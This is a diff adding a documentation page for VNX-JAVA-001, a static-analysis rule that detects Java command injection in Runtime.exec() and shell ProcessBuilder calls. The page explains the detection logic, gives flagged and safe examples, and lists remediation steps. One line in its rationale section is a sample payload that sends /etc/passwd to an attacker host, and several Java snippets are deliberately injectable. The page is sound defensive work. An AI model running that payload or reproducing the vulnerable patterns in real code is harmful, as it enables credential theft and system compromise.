@@ -1,0 +1,189 @@
+---
+title: "VNX-JAVA-001: Command injection via Runtime.exec() or a shell ProcessBuilder"
+nav: "VNX-JAVA-001"
+description: "Reports Runtime.exec() commands and shell ProcessBuilder scripts built at run time from concatenation, String.format or request values, directly or through a variable assigned a few lines above."
+order: 749
+sources: ["cli/internal/sast/rules/vnx-java-001.rego", "cli/website/content/docs/sast-rules/vnx-java-001.md"]
+checked: ["cli@4c8c3b7"]
+updated: "01 Nov 2026"
+generated: true
+---
+
+| Field | Value |
+|---|---|
+| Rule ID | `VNX-JAVA-001` |
+| Severity | High |
+| SARIF level | `error` |
+| Kind | `sast` |
+| Languages | Java |
+| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) |
+| CAPEC | [CAPEC-88](https://capec.mitre.org/data/definitions/88.html) |
+| ATT&CK | [T1059](https://attack.mitre.org/techniques/T1059/) |
+| CWSS vector | `CWSS:1.0/TI:H/AP:A/AL:A/IC:N/FC:LT/RP:N/RL:A/AV:I/AS:N/IN:A/SC:A/BI:H/DI:H/EX:H/EC:N/P:H` |
+| Tags | `command-injection` `dangerous-function` |
+| Source | [`internal/sast/rules/vnx-java-001.rego`](https://github.com/Vulnetix/cli/blob/main/internal/sast/rules/vnx-java-001.rego) |
+
+## Overview
+
+This rule detects calls to `Runtime.getRuntime().exec()` where the command string is built using the `+` operator, indicating that user-supplied data may be concatenated directly into the command. When the concatenated value is attacker-controlled, the result is OS command injection (CWE-78): the attacker can inject additional shell commands that the JVM executes with the privileges of the running process.
+
+## Why This Matters
+
+Command injection is consistently ranked in the OWASP Top 10 because it grants an attacker the same capabilities as a direct shell session. On a typical Java application server running as a service account, a successful injection can read application secrets, exfiltrate database credentials, install a reverse shell, or pivot to other internal systems.
+
+The single-string form of `Runtime.exec()` passes the command to the operating system's default shell (`/bin/sh -c` on Unix), which parses metacharacters such as `;`, `|`, `&&`, `$()`, and backticks as command separators. An input like `../../etc/passwd; curl http://attacker.com/$(cat /etc/passwd | base64)` turns a benign-looking file lookup into a data exfiltration channel.
+
+Unlike SQL injection, command injection has no parameterized equivalent in the single-string API, the only safe path is to move to an API that never invokes a shell.
+
+## What Gets Flagged
+
+The rule reports `Runtime.getRuntime().exec()` (or a variable assigned from `Runtime.getRuntime()`) whose command is concatenated or formatted with a non-constant value, reads a request value, or is a variable assigned that way within the 40 lines above. It also reports a `ProcessBuilder` or `pb.command()` that runs a shell (`sh -c`, `bash -c`, `cmd /c`, `powershell -Command`), inline or through a list built with `add("-c")`, whose script is built the same way. Two further shapes are reported: `Runtime.exec(cmd, envp[, dir])` whose environment array carries a request value (one attacker-chosen entry such as `LD_PRELOAD`, `PATH` or `BASH_ENV` changes what the child runs), and a shell started through an argument array held in a local (`String[] args = {a1, a2, ...}` handed to `new ProcessBuilder(args)`, `pb.command(args)` or `exec(args)`, where the first two elements are a shell and its flag, directly or through locals assigned as literals on any branch) when a later element carries a request value or a non-constant operand.
+
+```java
+// FLAGGED: concatenation into the command
+Process p = Runtime.getRuntime().exec("ping -c 1 " + host);
+
+// FLAGGED: two-line form
+String cmd = "nslookup " + req.getParameter("name");
+Runtime.getRuntime().exec(cmd);
+
+// FLAGGED: a shell parses the built script
+new ProcessBuilder("sh", "-c", "grep " + pattern + " /var/log/app.log");
+
+// FLAGGED: a request value in the child's environment
+String[] env = {"HOME=" + req.getParameter("home")};
+Runtime.getRuntime().exec("/usr/bin/backup", env);
+
+// FLAGGED: a shell started through an array held in a local
+String[] args = {a1, a2, "echo " + arg};   // a1 = "sh", a2 = "-c" on one branch
+new ProcessBuilder(args).start();
+```
+
+Not flagged: a constant command, `exec(args)` where `args` is a `String[]` local (the argument-array rule alone judges it), concatenation of literals and `UPPER_CASE` constants only, an argument list that does not invoke a shell (`new ProcessBuilder("convert", input, output)`), a command that arrives as a plain method parameter of a wrapper, comments and string literals.
+
+### Operands the method fixes
+
+Before reporting, the rule reads the enclosing method (at most 120 lines up) and asks what each operand actually holds at the call. An operand that provably holds a constant is not run-time data:
+
+- a literal or constant expression it was last assigned on every path to the call;
+- the taken side of an `if`/`else` or a ternary whose condition folds to a constant (integer literals, and `int` locals assigned once from a literal);
+- the case a `switch` on a constant selects;
+- the element a list index (`add`, `add(i, v)`, `set`, `remove(i)`) or a map key (`put`) actually holds, when that is a literal;
+- the result of a method in the same file, including a nested class, whose every `return` is a constant.
+
+```java
+// NOT FLAGGED: 8 + 4 * 3 < 10 is false, so target is always "127.0.0.1"
+int attempts = 4;
+if (8 + attempts * 3 < 10) target = request.getParameter("host");
+else target = "127.0.0.1";
+Runtime.getRuntime().exec("ping -c 1 " + target);
+
+// FLAGGED: the map key read back holds the request value
+logs.put("app", "/var/log/app.log");
+logs.put("custom", request.getParameter("log"));
+String file = logs.get("custom");
+new ProcessBuilder("sh", "-c", "tail -n 50 " + file).start();
+```
+
+Anything the analysis cannot resolve stays reported: a condition on run-time data, a call into another class that is handed a run-time value (a call with constant arguments is read as inert, below), a collection filled in a loop or handed to another method, a helper that returns (a transform of) its parameter, which stays as tainted as the argument it is handed (see Helpers in other files).
+
+### Helpers in other files
+
+A call into another class of the project is read from that class's own source instead of being guessed at. For `obj.m(args)`, `Cls.m(args)` and `new Cls(args).m(args)` the class is found by the declared type of `obj` (a local, a parameter, or the `new Cls(...)` it was assigned from) or by the static class name, and the method (at most 60 lines, overloads told apart by arity) is summarised as one of:
+
+- **constant**: every return is a literal, an `UPPER_CASE` name, a field initialised to a literal and never assigned again, or the result of a constant method of the same class. The call is as constant as that literal, whatever it is handed.
+- **a function of its arguments**: every return is constant once the parameters, and the fields the class's one constructor stores from its own parameters, are taken as constants. The call is only as risky as the arguments it depends on: a getter of a value stored by `new Cls(arg)` is as tainted as `arg`, and a method that ignores one of its parameters is not tainted by it.
+- **opaque**: anything else, such as a method that reads a request value or a header, a field a setter can change, or a call the summary cannot see through.
+
+A value of an interface or base class type runs the method of every project class that extends or implements it, so one implementation that returns its parameter keeps the call as tainted as that parameter. What is still reported: opaque calls, a simple class name that two files declare (ambiguous), a class outside the project, a type with an anonymous subclass, and a callee that hands the value to a third class (a callee is read one level deep). A method of the same file called without a receiver is summarised the same way.
+
+```java
+// NOT FLAGGED: Sanitizer.clean ignores its argument and returns a literal
+String value = sanitizer.clean(request.getParameter("value"));
+Runtime.getRuntime().exec("ls " + value);
+
+// NOT FLAGGED: the constructor argument is a literal, so the getter is too
+Holder holder = new Holder("report");
+Runtime.getRuntime().exec("ls " + holder.get());
+
+// FLAGGED: Echo.same returns its argument
+String value = echo.same(request.getParameter("value"));
+Runtime.getRuntime().exec("ls " + value);
+
+// FLAGGED: the getter returns what the constructor was given
+Holder holder = new Holder(request.getParameter("value"));
+Runtime.getRuntime().exec("ls " + holder.get());
+```
+
+### Calls that cannot bring data in
+
+A call into code the scan cannot see (another class or module) is treated as **inert**, and its value as a constant, when all of these hold:
+
+- its name is not that of a source (`read*`, `next*`, `getParameter*`, `getHeader*`, `getCookie*`, `getenv`, `getProperty`, `query`, `execute`);
+- every argument is a constant: a literal, or a name the method fixes;
+- its receiver is a type name, a `new` expression with constant arguments, or a local built from such a call, and that local is only ever called with constant arguments.
+
+```java
+// NOT REPORTED: the helper is given literals only
+CommandBook book = CommandBooks.standard();
+String flags = book.entry("listing");
+Runtime.getRuntime().exec("ls " + flags);
+
+// REPORTED: a run-time argument
+String flags = book.entry(request.getParameter("tool"));
+
+// REPORTED: the receiver was built from, or fed, a run-time value
+CommandBook book = new CommandBook(request.getParameter("book"));
+
+// REPORTED: a source-like method name
+String flags = Console2.readLine("flags");
+```
+
+Anything that fails one of the tests stays reported, so a helper that hands back its argument is never mistaken for a constant.
+
+## Remediation
+
+1. **Switch to `ProcessBuilder` with a split argument list.** When you supply each argument as a separate element of a `List<String>`, Java never passes the command through a shell, metacharacters in user input are treated as literal data, not shell syntax.
+
+   ```java
+   // SAFE: ProcessBuilder with explicit argument list, no shell involved
+   String filename = request.getParameter("file");
+
+   // Validate first: only allow safe characters
+   if (!filename.matches("[a-zA-Z0-9._-]+")) {
+       throw new IllegalArgumentException("Invalid filename");
+   }
+
+   ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.png");
+   pb.redirectErrorStream(true);
+   Process process = pb.start();
+   ```
+
+2. **Validate input before use.** Apply an allowlist (not a denylist) to any value that will appear in a command. A regular expression like `[a-zA-Z0-9._-]+` covers most filename and hostname use cases. Reject anything that does not match.
+
+3. **Drop OS commands in favour of Java APIs.** For most common tasks, file conversion, compression, image processing, there are pure-Java libraries (`Apache Commons Imaging`, `Thumbnailator`, `Apache Commons Compress`) that never spawn a child process. Prefer them whenever feasible.
+
+4. **Run the JVM process with minimal OS privileges.** Use a dedicated service account with only the permissions the application genuinely needs. Apply Linux seccomp or Java Security Manager policies where available to restrict what child processes can do.
+
+5. **Log and alert on anomalous arguments.** Even with validation, log all computed command strings before execution. Structured logging makes it easier to detect injection attempts in a SIEM.
+
+## References
+
+- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
+- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
+- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
+- [OWASP Java Security Cheat Sheet – OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
+- [Java ProcessBuilder documentation](https://docs.oracle.com/en/java/docs/api/java.base/java/lang/ProcessBuilder.html)
+- [OWASP ASVS V5 – Validation, Sanitization and Encoding](https://owasp.org/www-project-application-security-verification-standard/)
+
+## Suppressing this rule
+
+Put a `nosec` comment on the line, or on line 1 to cover the whole file. Use the comment marker of the file's language (`#`, `//`, `--` or `;`):
+
+```text
+# nosec vnx-java-001
+// nosec vnx-java-001
+```
+
+Or record an ignore rule: `vulnetix ignore add --rule vnx-java-001 --reason "..."`. See [Suppressing findings](/sast/guides/suppressing-findings/).
